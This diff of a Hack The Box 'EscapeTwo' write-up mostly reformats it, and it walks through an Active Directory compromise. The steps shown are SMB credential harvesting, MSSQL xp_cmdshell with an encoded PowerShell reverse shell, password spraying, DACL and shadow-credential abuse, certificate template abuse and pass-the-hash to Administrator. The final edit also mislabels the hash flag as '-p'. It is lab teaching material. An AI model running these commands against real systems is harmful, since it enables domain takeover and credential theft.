@@ -1,15 +1,14 @@
 <div class="banner">
     <div class="ads">
-        <span></span>
-        Get Free - Docs template
+        <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="size-6"><path stroke-linecap="round" stroke-linejoin="round" d="M12 12.75c1.148 0 2.278.08 3.383.237 1.037.146 1.866.966 1.866 2.013 0 3.728-2.35 6.75-5.25 6.75S6.75 18.728 6.75 15c0-1.046.83-1.867 1.866-2.013A24.204 24.204 0 0 1 12 12.75Zm0 0c2.883 0 5.647.508 8.207 1.44a23.91 23.91 0 0 1-1.152 6.06M12 12.75c-2.883 0-5.647.508-8.208 1.44.125 2.104.52 4.136 1.153 6.06M12 12.75a2.25 2.25 0 0 0 2.248-2.354M12 12.75a2.25 2.25 0 0 1-2.248-2.354M12 8.25c.995 0 1.971-.08 2.922-.236.403-.066.74-.358.795-.762a3.778 3.778 0 0 0-.399-2.25M12 8.25c-.995 0-1.97-.08-2.922-.236-.402-.066-.74-.358-.795-.762a3.734 3.734 0 0 1 .4-2.253M12 8.25a2.25 2.25 0 0 0-2.248 2.146M12 8.25a2.25 2.25 0 0 1 2.248 2.146M8.683 5a6.032 6.032 0 0 1-1.155-1.002c.07-.63.27-1.222.574-1.747m.581 2.749A3.75 3.75 0 0 1 15.318 5m0 0c.427-.283.815-.62 1.155-.999a4.471 4.471 0 0 0-.575-1.752M4.921 6a24.048 24.048 0 0 0-.392 3.314c1.668.546 3.416.914 5.223 1.082M19.08 6c.205 1.08.337 2.187.392 3.314a23.882 23.882 0 0 1-5.223 1.082" /></svg>
+        Offensive Security
     </div>
     <h1>
-        <span>¿By Vishok - Hacking Pentesting?</span>
-        EscapeTwo HTB
+        <span>Vishok - Hacking Pentesting</span>
+        EscapeTwo HTB Writeup
     </h1>
 </div>
 
-####
 ####
 ####
 ## Open ports in the target machine
@@ -84,13 +83,12 @@ echo '
 ' | grep -oE '^([0-9])+' | sed -z 's/\n/,/g'
 ```
 ####
-| Grep and sed param | Description |
-| ----- | ----- |
-| -o | Make unique matches |
-| -E | Find other results into a unique string |
-| -z | Separate lines for each null character, is used to sustitute |
-| s/ | Especify the start of the sustitution |
-| /g | Especify the end of the sustitution |
+- ###### Grep and Sed Param
+    - `-o` Make unique matches 
+    - `-E` Find other results into a unique string 
+    - `-z` Separate lines for each null character, is used to sustitute 
+    - `s/` Especify the start of the sustitution 
+    - `/g` Especify the end of the sustitution 
 ####
 Result of the nmap scan:
 ####
@@ -174,8 +172,8 @@ Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
 ####
 ####
 ## Services that is running in target machine
-### SMB
-So this machine have many ports, many services, so is many information to analyse. The Hackthebox give us a credentials simulating a real pentest environment, so we can use this credentials to connect to the target machine. The credentials are: `rose:KxEPkKe6R8su`. The port *5985* is open, so we can use this port to connect to the target machine using **evil-winrm**, but this is not possible. But there are other services: [*SMB*, *LDAP*].
+### Samba
+So this machine have many ports, many services, so is many information to analyse. The Hackthebox give us a credentials simulating a real pentest environment, so we can use this credentials to connect to the target machine. The credentials are: `rose:KxEPkKe6R8su`. The port `5985` is open, so we can use this port to connect to the target machine using **evil-winrm**, but this is not possible. But there are other services: *(SMB, LDAP)*.
 ####
 Having a valid credentials, we could try to enumerate a shared resources using **netexec**:
 ####
@@ -202,13 +200,12 @@ We can see 2 resources that are interesting: **Accounting Department** and **Use
 smbclient '//10.10.11.51/Accounting Department' -U rose%KxEPkKe6R8su
 ```
 ####
-| Smbclient param | Description |
-| ----- | ----- |
-| -U | Pass the credentials in format: `username%password` |
+- ###### Smbclient Param
+    - `-U` Pass the credentials in format: `username%password`
 ####
 At the moment to gain access an enter into *SMB*, we can use the Windows or Linux commands to move into this *CLI*. Listing the content we are able to see 2 files: `accounting_2024.xlsx` and `accounts.xlsx`. To see the content of those files, is necessary download it in our machine, the command to download files is `get`.
 ####
-```ruby
+```bash
 get accounting_2024.xlsx
 get accounts.xlsx
 ```
@@ -237,22 +234,21 @@ file accounting_2024.xlsx
 ####
 Both files are a *ZIP* files, so we can extract the content of the files using **unzip**. The file that report us something interesting in the **accounts.xlsx** file, specifically in the `xl` directory. Exist one file `sharedStrings.xml` that posses a credentials.
 ####
-```ruby
+```bash
 cd xl
 xmllint --format sharedStrings.xml
 ```
 ####
 The output is very difficult to read, exist a tool to see the **xml** files more beautifull, **xmllint** could help us here, but is difficult to read yet. We could try use other focus using tools like **sed** and **awk**. The data is more easy to so:
 ####
-```ruby
+```bash
 xmllint --format sharedStrings.xml | sed -z 's/<si>/ /g' | sed -z 's/<\/si>/ /g' | sed -z 's/<t xml:space="preserve">/<th>/g' | sed -z 's/<\/t>/<\/th>/g' | grep "<th>" | sed 's/<th>//g; s/<\/th>//g' > dataParse.txt
 ```
 ####
-| Sed param | Description |
-| ----- | ----- |
-| -z | Separate lines for each null character, is used to sustitute |
-| s/ | Especify the start of the sustitution |
-| /g | Especify the end of the sustitution |
+- ###### Sed Param
+    - `-z` Separate lines for each null character, is used to sustitute 
+    - `s/` Especify the start of the sustitution 
+    - `/g` Especify the end of the sustitution 
 ####
 <div class="info">
 
@@ -290,17 +286,16 @@ if __name__ == '__main__':
     main()
 ```
 ####
-| Awk param | Description |
-| ----- | ----- |
-| BEGIN | Block executed before processing any input lines (*Initialization*) |
-| END | Block executed after all input lines are processed (*Finalization*) |
-| NR | Built-in variable: current input record (*Line*) number |
-| $0 | Entire current input line |
-| printf | Prints formatted output |
-| if(condition) | Conditional statement to execute code if condition is true |
-| % | Modulo operator, used to group lines e.g. *NR%5* |
-| { ... } | Action block, code to execute for each line or condition |
-| a, b, c, d, e | Variables used to temporarily store each field/line |
+- ###### Awk Param
+    - `BEGIN` Block executed before processing any input lines **Initialization**
+    - `END` Block executed after all input lines are processed **Finalization**
+    - `NR` Built-in variable: current input record **Line** number
+    - `$0` Entire current input line
+    - `printf` Prints formatted output
+    - `if(condition)` Conditional statement to execute code if condition is true
+    - `%` Modulo operator, used to group lines e.g. `NR%5`
+    - `{ ... }` Action block, code to execute for each line or condition
+    - `a, b, c, d, e` Variables used to temporarily store each field/line
 ####
 The output is this:
 ####
@@ -317,7 +312,7 @@ python3 parse.py
         ======================================================================================================================
 ```
 ####
-Is necessary that the final if will be executed changed the column numbers: `if(NR%5 == 0)` to `if(NR%4 == 0)` to see the final credentials, because this credential no posses a **Last_name** so is not a *5* module. After that, we have more credentials, so we could try to see if some of this user is valid to connect in the target machine using the *5985* port, **evil-winrm** help us here. But nothing user is in the *Windows Remote Management* group. The *1433* port is open, we can see this in nmap scan and is running a *MSSQL*.
+Is necessary that the final if will be executed changed the column numbers: `if(NR%5 == 0)` to `if(NR%4 == 0)` to see the final credentials, because this credential no posses a **Last_name** so is not a `5` module. After that, we have more credentials, so we could try to see if some of this user is valid to connect in the target machine using the `5985` port, **evil-winrm** help us here. But nothing user is in the *(Windows Remote Management)* group. The `1433` port is open, we can see this in nmap scan and is running a *MSSQL*.
 ####
 ####
 ####
@@ -325,7 +320,7 @@ Is necessary that the final if will be executed changed the column numbers: `if(
 ### MSSQL
 So in the previous output parte data we saw a credential related with that service: `sa:MSSQLP@ssw0rd!`, so we could try ro connect at this service using **impacket**.
 ####
-```ruby
+```bash
 impacket-mssqlclient sequel.htb/sa:'MSSQLP@ssw0rd!'@10.10.11.51
 ```
 ####
@@ -333,7 +328,7 @@ The *MSSQL* have a specifique form to enumerate things, this service have a way 
 ####
 <div class="info">
 
-> **xp_cmdshell** command execution is a powerful technique available to penetration testers targeting Microsoft SQL Server environments. Microsoft introduced xp_cmdshell with T-SQL in **SQL Server 6.0** (1995) as part of the extended stored procedures, allowing users to execute operating system commands directly from SQL Server.
+> **xp_cmdshell** command execution is a powerful technique available to penetration testers targeting Microsoft SQL Server environments. Microsoft introduced xp_cmdshell with T-SQL in *(SQL Server 6.0)* (1995) as part of the extended stored procedures, allowing users to execute operating system commands directly from SQL Server.
 </div>
 
 ####
@@ -347,13 +342,13 @@ The *One-liner* will be a Powershell command with **rlwrap** listener.
 
 ####
 ```ruby
-In MSSQL-Client ->
-1. EXEC sp_configure 'xp_cmdshell', 1;
-2. RECONFIGURE;
-3. xp_cmdshell powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE...
+MSSQL-Client ->
+    1. EXEC sp_configure 'xp_cmdshell', 1;
+    2. RECONFIGURE;
+    3. xp_cmdshell powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE...
 
-In our machine ->
-rlwrap nc -nlvp 1234
+Local Machine ->
+    rlwrap nc -nlvp 1234
 ```
 ####
 Our user `sql_svc` don't have the user flag, so if we see the users in `C:\Users`, we are able to see a **ryan** user. So that suggest that we need to convert in ryan user. Exploring in the target machine in the main path: `C:\` exist a directory named *SQL2019*. Entering with deep into this directory we can se several files:
@@ -406,7 +401,7 @@ BROWSERSVCSTARTUPTYPE="Automatic"
 IAcceptSQLServerLicenseTerms=True
 ```
 ####
-Here there other credential, we don't now for which user work this password `WqSZAF6CysDQbGb3`, so to determine for which user work this password, we can create a password and user dicctionary to prove that credentials with **netexec** for [*MSSQL*, *LDAP*, *SMB*] services that is running in the target machine.
+Here there other credential, we don't now for which user work this password `WqSZAF6CysDQbGb3`, so to determine for which user work this password, we can create a password and user dicctionary to prove that credentials with **netexec** for *(MSSQL, LDAP, SMB)* services that is running in the target machine.
 ####
 ```ruby
 netexec winrm 10.10.11.51 -u users.txt -p pass.txt
@@ -430,28 +425,27 @@ netexec winrm 10.10.11.51 -u users.txt -p pass.txt
         WINRM       10.10.11.51     5985   DC01             [+] sequel.htb\ryan:WqSZAF6CysDQbGb3 (Pwn3d!)
 ```
 ####
-| Netexec param | Description |
-| ----- | ----- |
-| -u | Specify a user or users file |
-| -p | Specify a password or password file |
+- ###### Netexec Param
+    - `winrm` Specifies the service to test; there are others such as *(ldap, smb)*
+    - `-u` Specifies the user
+    - `-p` Specifies the password
 ####
 That credential work for **ryan** user, so here we will use the **evil-winrm** tool.
 ####
-```ruby
+```bash
 evil-winrm -i 10.10.11.51 -u ryan -p WqSZAF6CysDQbGb3
 ```
 ####
-| Evil-winrm param | Description |
-| ----- | ----- |
-| -i | Specify the ip target host |
-| -u | Specify the user |
-| -p | Specify the password |
+- ###### Evil-winrm Param
+    - `-i` Specify the ip target host 
+    - `-u` Specify the user 
+    - `-p` Specify the password 
 ####
 ####
 ####
 ## Second exploit phase (Privilage Escalation)
 ### WriteOwner
-If we execute a **bloodhound-python** in our machine aginst the target machine to discover a potential vector of explotation, we are able to see that the user `ryan` have *WriteOwner* permissions over `ca_svc`. So the **impacket** suite have 2 tools that will help us to exploit this aproach because the `ca_svc` user is the other unique user, so the privilage escalation is for here.
+If we execute a **bloodhound-python** in our machine aginst the target machine to discover a potential vector of explotation, we are able to see that the user `ryan` have *(WriteOwner)* permissions over `ca_svc`. So the **impacket** suite have 2 tools that will help us to exploit this aproach because the `ca_svc` user is the other unique user, so the privilage escalation is for here.
 ####
 First, we need to change the **ownership** `ca_svc` account. The user that we posses credentials to gain access in the target machine is **ryan** and he have that permissions so we will try to be the owner of that account.
 ####
@@ -465,13 +459,12 @@ python3 impacket-owneredit -action write -new-owner ryan -target ca_svc sequel.h
         [*] OwnerSid modified successfully!
 ```
 ####
-| Impacket-owneredir param | Description |
-| ----- | ----- |
-| -action | Specifies the action to perform. Valid options: [*Read*, *Write*, *Restore*] |
-| -new-owner | Specifies the new owner of the target object. |
-| -target | Specifies the target object to modify |
+- ###### Impacket-owneredir Param
+    - `-action` Specifies the action to perform. Valid options: *(Read, Write, Restore)*
+    - `-new-owner` Specifies the new owner of the target object.
+    - `-target` Specifies the target object to modify
 ####
-Now we need to specify what level of control or permissions, impacket have a tool based on DACL [*Discretionary Access Control List*]. If we will have a **full control** in this account when we spawn, we will spawned like a super user.
+Now we need to specify what level of control or permissions, impacket have a tool based on DACL *(Discretionary Access Control List)*. If we will have a **full control** in this account when we spawn, we will spawned like a super user.
 ####
 ```ruby
 python3 impacket-dacledit -action write -rights FullControl -principal ryan -target ca_svc sequel.htb/ryan:WqSZAF6CysDQbGb3
@@ -480,10 +473,9 @@ python3 impacket-dacledit -action write -rights FullControl -principal ryan -tar
         [*] DACL modified successfully!
 ```
 ####
-| Impacket-dacleedit | Description | 
-| ----- | ----- |
-| -rights | Specify the rights or permissions that the new user will have |
-| -principal | Sepecify the user |
+- ###### Impacket-dacleedit Param
+    - `-rights` Specify the rights or permissions that the new user will have
+    - `-principal` Sepecify the user
 ####
 We already achieve to take control over the **ca_svc** user. Now we need to get the credentials. In this case the **certipy** tool take place for linux and **certify** for windows, the form to install the first tool is: `pip install certipy --break-system-packages`, the other tool you can download it in github: [Certify-Exe-File](https://github.com/r3motecontrol/Ghostpack-CompiledBinaries).
 ####
@@ -506,14 +498,13 @@ certipy shadow auto -u 'ryan@sequel.htb' -p 'WqSZAF6CysDQbGb3' -account ca_svc -
         [*] NT hash for 'ca_svc': None
 ```
 ####
-| Certipy param | Description | 
-| ----- | ----- |
-| shadow| Abuse Shadow Credentials for account takeover |
-| -u | Specify a user |
-| -p | Specify a password |
-| -account | Specify a account when we are try to ownership |
+- ###### Certipy Param
+    - `shadow` Abuse Shadow Credentials for account takeover 
+    - `-u` Specify a user 
+    - `-p` Specify a password 
+    - `-account` Specify a account when we are try to ownership 
 ####
-How you can see in previous output that **certipy** command don't work, in this web site there is a page dedicated to cover the *Clock Skew Too Great* Kerberos error. The most factivle solution is use **faketime**. For this, is necessary firstly, get the current date of the target machine executing `date` like **ryan** into the evil-winrm session or use a **ntpdate**
+How you can see in previous output that **certipy** command don't work, in this web site there is a page dedicated to cover the *(Clock Skew Too Great)* Kerberos error. The most factivle solution is use **faketime**. For this, is necessary firstly, get the current date of the target machine executing `date` like **ryan** into the evil-winrm session or use a **ntpdate**
 ####
 ```ruby
 date
@@ -604,7 +595,7 @@ certipy find -u 'ca_svc@sequel.htb' -hashes :3b181b914e7a9d5508ea1e20bc2b7fce -s
 </div>
 
 ####
-We need to try to enable that vulnerable template in the target machine *DunderMifflinAuthentication*.
+We need to try to enable that vulnerable template in the target machine *(DunderMifflinAuthentication)*.
 ####
 ```ruby
 KRB5CCNAME=$PWD/ca_svc.ccache faketime "2025-05-06 15:24:37" certipy template -k -template DunderMifflinAuthentication -dc-ip 10.10.11.51 -target dc01.sequel.htb
@@ -625,7 +616,7 @@ faketime "2025-05-06 15:30:35" certipy req -u ca_svc -hashes '3b181b914e7a9d5508
         [*] Requesting certificate via RPC
         [+] Trying to connect to endpoint: ncacn_np:10.10.11.51[\pipe\cert]
         [+] Connected to endpoint: ncacn_np:10.10.11.51[\pipe\cert]
-        [-] Got error while trying to request certificate: code: 0x8009480f - CERTSRV_E_SUBJECT_DNS_REQUIRED - The Domain Name System (DNS) name is unavailable and cannot be added to the Subject Alternate name.
+        [-] Got error while trying to request certificate: code: 0x8009480f - CERTSRV_E_SUBJECT_DNS_REQUIRED - The Domain Name System (DNS) name is unavailable and cannot be added to the Subject  Alternate name.
         [*] Request ID is 27
         Would you like to save the private key? (y/N) y
         [*] Saved private key to 27.key
@@ -730,32 +721,30 @@ The **perm** file is not generated in the target machine so we need to copy both
 openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx -passout pass:
 ```
 ####
-| Openssl param | Description |
-| ----- | ----- |
-| pkcs12 | Specifies the *PKCS#12* tool for creating `.pfx` or `.p12` files (used for storing certificates and private keys) |
-| -in | Path of the file |
-| -keyex | Sets the key exchange attribute (used for legacy compatibility, mainly with Microsoft CSPs) |
-| -export | Tells OpenSSL to create a new *PKCS#12* file |
-| -out cert.pfx | Output file name for the resulting *PKCS#12* `.pfx` file |
-| -passout pass: | Set a empty or null password |
+- ###### Openssl Param
+    - `pkcs12` Specifies the **PKCS#12** tool for creating `.pfx` or `.p12` files (used for storing certificates and private keys) 
+    - `-in` Path of the file 
+    - `-keyex` Sets the key exchange attribute (used for legacy compatibility, mainly with Microsoft CSPs) 
+    - `-export` Tells OpenSSL to create a new **PKCS#12** file 
+    - `-out cert.pfx` Output file name for the resulting **PKCS#12** `.pfx` file 
+    - `-passout pass:` Set a empty or null password 
 ####
 Finally using that *PFX* file we can to get a TGT hash of the **Administrator** user:
 ####
 ```ruby
 faketime "2025-05-06 15:44:55" certipy auth -pfx cert.pfx -dc-ip 10.10.11.51 -domain sequel.htb
     Result ->
-    [*] Using principal: administrator@sequel.htb
-    [*] Trying to get TGT...
-    [*] Got TGT
-    [*] Saved credential cache to 'administrator.ccache'
-    [*] Trying to retrieve NT hash for 'administrator'
-    [*] Got hash for 'administrator@sequel.htb': aad3b435b51404eeaad3b435b51404ee:7a8d4e04986afa8ed4060f75e5a0b3ff
+        [*] Using principal: administrator@sequel.htb
+        [*] Trying to get TGT...
+        [*] Got TGT
+        [*] Saved credential cache to 'administrator.ccache'
+        [*] Trying to retrieve NT hash for 'administrator'
+        [*] Got hash for 'administrator@sequel.htb': aad3b435b51404eeaad3b435b51404ee:7a8d4e04986afa8ed4060f75e5a0b3ff
 ```
 ####
 The format of the hash is **salt:hash**, so we can use it in evil-winrm: `evil-winrm -i 10.10.11.51 -u administrator -H 7a8d4e04986afa8ed4060f75e5a0b3ff`.
 ####
-| Evil-winrm param | Description |
-| ----- | ----- |
-| -i | Specify the ip target host |
-| -u | Specify the user |
-| -H | Specify the hash password format |
+- ###### Evil-winrm Param
+    - `-i` Specify the ip target host 
+    - `-u` Specify the user 
+    - `-p` Specify the password
